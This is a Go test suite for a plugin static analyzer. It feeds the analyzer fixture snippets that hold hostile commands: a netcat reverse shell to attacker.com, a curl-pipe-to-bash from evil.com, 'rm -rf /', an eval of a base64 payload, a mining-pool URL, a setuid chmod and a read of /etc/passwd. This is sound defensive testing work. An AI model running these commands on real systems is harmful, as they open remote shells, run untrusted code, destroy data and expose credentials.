package pluginrunner

import (
	"os"
	"path/filepath"
	"testing"
)

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func TestAnalyzePlugin_CleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import grpc
def on_event(event):
    print("received", event.type)
`)
	writeFile(t, dir, "plugin.yaml", `
name: clean-plugin
version: 1.0.0
entrypoint: python main.py
language: python
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Errorf("expected safe plugin, got %d findings", len(report.Findings))
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned, got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_ShellExec(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import os
os.system("rm -rf /")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding")
	}
}

func TestAnalyzePlugin_ReverseShell(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "backdoor.sh", `#!/bin/bash
nc -e /bin/sh attacker.com 4444
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected network critical finding")
	}
}

func TestAnalyzePlugin_Eval(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exploit.py", `
payload = base64.b64decode("aW1wb3J0IG9z")
eval(payload)
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	categories := map[string]bool{}
	for _, f := range report.Findings {
		categories[f.Category] = true
	}
	if !categories["obfuscation"] {
		t.Error("expected obfuscation finding")
	}
}

func TestAnalyzePlugin_CryptoMining(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "miner.js", `
const pool = "stratum+tcp://pool.monero.com:3333";
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "cryptomining" {
			found = true
		}
	}
	if !found {
		t.Error("expected cryptomining finding")
	}
}

func TestAnalyzePlugin_RuntimeInstall(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "setup.sh", `#!/bin/bash
curl https://evil.com/payload.sh | bash
pip install evil-package
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "runtime_install" {
			found = true
		}
	}
	if !found {
		t.Error("expected runtime_install finding")
	}
}

func TestAnalyzePlugin_NetworkWarning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "fetcher.py", `
import requests
resp = requests.get("https://api.anilist.co/graphql")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// network access is WARNING not CRITICAL — plugin is still "safe"
	if !report.Safe {
		t.Error("expected safe plugin (network is warning, not critical)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected network warning finding")
	}
}

func TestAnalyzePlugin_PrivilegeEscalation(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "escalate.sh", `#!/bin/bash
sudo chmod u+s /usr/bin/something
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
}

func TestAnalyzePlugin_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "index.js", `console.log("clean")`)
	writeFile(t, dir, "node_modules/evil/index.js", `eval("malicious")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe — node_modules should be skipped")
	}
	if report.TotalFilesScanned != 1 {
		t.Errorf("expected 1 file scanned (node_modules skipped), got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_SkipsBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin.bin", string([]byte{0x7f, 'E', 'L', 'F'}))
	writeFile(t, dir, "main.py", `print("clean")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned (.bin counted with warning), got %d", report.TotalFilesScanned)
	}
	var found bool
	for _, f := range report.Findings {
		if f.Category == "compiled_binary" && f.File == "plugin.bin" {
			found = true
		}
	}
	if !found {
		t.Error("expected compiled_binary warning for plugin.bin")
	}
}

func TestAnalyzePlugin_ExtractsURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "fetcher.py", `
import requests
API = "https://graphql.anilist.co"
resp = requests.get(f"https://api.example.com/{media_id}")
base = "https://" + host + "/api"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) == 0 {
		t.Fatal("expected URLs to be extracted")
	}
	types := map[string]bool{}
	for _, u := range report.URLs {
		types[u.Type] = true
	}
	if !types["literal"] {
		t.Error("expected literal URL")
	}
	if !types["template"] {
		t.Error("expected template URL")
	}
	if !types["concatenation"] {
		t.Error("expected concatenation URL")
	}
}

func TestAnalyzePlugin_NoURLsInCleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
def hello():
    return "world"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) != 0 {
		t.Errorf("expected no URLs, got %d", len(report.URLs))
	}
}

func TestAnalyzePlugin_DeduplicatesURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
url = "https://api.example.com/v1"
other = "https://api.example.com/v1"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, u := range report.URLs {
		if u.URL == "https://api.example.com/v1" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected 1 deduplicated URL, got %d", count)
	}
}

func TestAnalyzePlugin_ExtractsNonHTTPSchemes(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
ws_url = "wss://realtime.example.com/ws"
ftp_url = "ftp://files.example.com/data.csv"
db_url = "postgresql://user:pass@db.example.com/mydb"
ssh_url = "ssh://deploy@server.example.com"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	schemes := map[string]bool{}
	for _, u := range report.URLs {
		for _, prefix := range []string{"wss://", "ftp://", "postgresql://", "ssh://"} {
			if len(u.URL) >= len(prefix) && u.URL[:len(prefix)] == prefix {
				schemes[prefix] = true
			}
		}
	}
	for _, expected := range []string{"wss://", "ftp://", "postgresql://", "ssh://"} {
		if !schemes[expected] {
			t.Errorf("expected %s URL to be extracted", expected)
		}
	}
}

func TestAnalyzePlugin_SuspiciousSchemeWarning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
ws = "wss://evil.com/exfil"
ssh = "ssh://root@target.com"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "suspicious_url" {
			found = true
		}
	}
	if !found {
		t.Error("expected suspicious_url warning for non-HTTP schemes")
	}
}

func TestAnalyzePlugin_SensitiveFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exfil.py", `
with open("/etc/passwd") as f:
    data = f.read()
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe — access to /etc/passwd")
	}
}

func TestAnalyze_CleanPlugin_IsSafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `print("hello")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Fatal("expected Safe=true for clean plugin")
	}
	if len(report.Findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(report.Findings))
	}
}

func TestAnalyze_CriticalFinding_IsUnsafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "bad.py", `os.system("whoami")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected Safe=false when critical finding exists")
	}
	hasCritical := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Fatal("expected at least one critical finding")
	}
}

func TestAnalyze_WarningOnly_StillSafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "net.py", `requests.get("https://example.com")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Fatal("expected Safe=true — warnings should not make plugin unsafe")
	}
	if len(report.Findings) == 0 {
		t.Fatal("expected at least one warning finding")
	}
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			t.Fatal("unexpected critical finding")
		}
	}
}

func TestAnalyze_SkipsNodeModules_NoFindings(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "clean.js", `console.log("ok")`)
	writeFile(t, dir, "node_modules/pkg/index.js", `eval("evil")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			t.Fatal("eval in node_modules should not be flagged")
		}
	}
}

func TestAnalyze_SkipsBinaryExtensions(t *testing.T) {
	dir := t.TempDir()
	for _, ext := range []string{".so", ".dll"} {
		writeFile(t, dir, "lib"+ext, `eval("should not be scanned")`)
	}
	// Valid PNG magic bytes
	writeFile(t, dir, "icon.png", string([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}))
	writeFile(t, dir, "clean.py", `print("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// .so and .dll = executable (counted + warning), .png = valid asset (skipped), clean.py = scanned
	if report.TotalFilesScanned != 3 {
		t.Errorf("expected 3 files scanned (.png skipped, .so/.dll warned), got %d", report.TotalFilesScanned)
	}
	var binaryWarnings int
	for _, f := range report.Findings {
		if f.Category == "compiled_binary" {
			binaryWarnings++
		}
	}
	if binaryWarnings != 2 {
		t.Errorf("expected 2 compiled_binary warnings (.so/.dll), got %d", binaryWarnings)
	}
	if !report.Safe {
		t.Fatal("expected safe — compiled_binary is WARNING not CRITICAL")
	}
}

func TestAnalyze_MIMEMismatch(t *testing.T) {
	dir := t.TempDir()
	// ELF binary disguised as .png
	writeFile(t, dir, "evil.png", string([]byte{0x7f, 'E', 'L', 'F', 0, 0, 0, 0}))

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, f := range report.Findings {
		if f.Category == "mime_mismatch" && f.File == "evil.png" {
			found = true
		}
	}
	if !found {
		t.Error("expected mime_mismatch finding for disguised .png")
	}
	if report.Safe {
		t.Error("expected unsafe — mime_mismatch should mark report as not safe")
	}
}

func TestAnalyze_ScansUnknownExtensions(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.txt", `os.system("pwned")`)
	writeFile(t, dir, "backup.bak", `subprocess.call("rm -rf /")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned (.txt and .bak), got %d", report.TotalFilesScanned)
	}
	if report.Safe {
		t.Fatal("expected unsafe — .txt/.bak files should be scanned")
	}
}

func TestAnalyze_DynamicImport_Critical(t *testing.T) {
	for _, code := range []string{
		`__import__("os")`,
		`importlib.import_module("os")`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.py", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "dynamic_import" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected dynamic_import critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_NodeVmEscape_Critical(t *testing.T) {
	for _, code := range []string{
		`vm.runInNewContext("code")`,
		`new Function("return this")()`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "escape.js", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "sandbox_escape" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected sandbox_escape critical for %q", code)
			}
		})
	}
}

func TestAnalyze_CtypesCDLL_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "native.py", `lib = ctypes.CDLL("libc.so.6")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe for ctypes.CDLL")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "native_code" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected native_code critical finding")
	}
}

func TestAnalyze_URLExtraction_Dedup(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "urls.py", `
url1 = "https://same.example.com/api"
url2 = "https://same.example.com/api"
url3 = "https://same.example.com/api"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, u := range report.URLs {
		if u.URL == "https://same.example.com/api" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected URL to appear exactly once, got %d", count)
	}
}

func TestAnalyze_SuspiciousScheme_Warning(t *testing.T) {
	for _, scheme := range []string{"ssh://host.com", "telnet://host.com"} {
		t.Run(scheme, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "test.py", `url = "`+scheme+`"`)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "suspicious_url" && f.Severity == SeverityWarning {
					found = true
				}
			}
			if !found {
				t.Errorf("expected suspicious_url warning for %s", scheme)
			}
		})
	}
}

func TestAnalyze_DepManifest_Warning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package.json", `{"name": "test", "version": "1.0.0"}`)
	writeFile(t, dir, "main.js", `console.log("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "unvendored_deps" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected unvendored_deps warning for package.json")
	}
}

func TestSeverityLabel(t *testing.T) {
	tests := []struct {
		s    AnalysisSeverity
		want string
	}{
		{SeverityCritical, "CRITICAL"},
		{SeverityWarning, "WARNING"},
		{SeverityInfo, "INFO"},
		{AnalysisSeverity(99), "INFO"},
	}
	for _, tt := range tests {
		if got := severityLabel(tt.s); got != tt.want {
			t.Errorf("severityLabel(%d) = %q, want %q", tt.s, got, tt.want)
		}
	}
}

func TestNewStaticAnalyzer(t *testing.T) {
	a := NewStaticAnalyzer()
	if a == nil {
		t.Fatal("expected non-nil analyzer")
	}
}

func TestStaticAnalyzer_Analyze_CleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `print("hello")`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe plugin")
	}
	if report.FileCount != 1 {
		t.Errorf("expected 1 file, got %d", report.FileCount)
	}
}

func TestStaticAnalyzer_Analyze_UnsafePlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "bad.py", `os.system("whoami")`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Error("expected unsafe plugin")
	}
	if len(report.Issues) == 0 {
		t.Error("expected issues to be reported")
	}
}

func TestStaticAnalyzer_Analyze_WithURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "net.py", `url = "https://api.example.com/v1"`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) == 0 {
		t.Error("expected URLs in report")
	}
}

func TestStaticAnalyzer_Analyze_InvalidDir(t *testing.T) {
	a := NewStaticAnalyzer()
	_, err := a.Analyze("/nonexistent/path/to/plugin")
	if err == nil {
		t.Error("expected error for nonexistent dir")
	}
}

func TestAnalyze_SDKStubsSkipped(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin_pb2.py", `eval("should not be scanned")`)
	writeFile(t, dir, "plugin_pb2_grpc.py", `os.system("hidden")`)
	writeFile(t, dir, "plugin.proto", `exec("hidden")`)
	writeFile(t, dir, "main.py", `print("clean")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 1 {
		t.Errorf("expected 1 file scanned (stubs skipped), got %d", report.TotalFilesScanned)
	}
	if !report.Safe {
		t.Fatal("expected safe — SDK stubs should be skipped entirely")
	}
}
